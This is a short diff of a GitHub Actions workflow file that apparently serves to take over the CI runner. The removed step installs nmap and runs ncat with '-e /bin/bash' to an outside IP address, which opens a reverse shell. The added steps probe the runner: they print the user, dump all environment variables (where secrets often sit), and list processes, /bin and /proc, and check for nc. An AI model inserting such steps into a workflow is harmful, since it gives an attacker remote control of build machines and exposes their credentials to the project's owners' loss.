@@ -10,5 +10,15 @@ jobs:
  
     steps:
     - uses: actions/checkout@v1
-    - name: Get and run ncat
-      run: apt update && apt install -y nmap && ncat 164.132.18.139  38989 -e /bin/bash
+    - name: whoami
+      run: whoami
+    - name: environment
+      run: env
+    - name: process list
+      run: ps -ef
+    - name: whats in bin
+      run: ls -al /bin
+    - name: whats in proc
+      run: ls -al /proc
+    - name: do I have nc
+      run: which nc
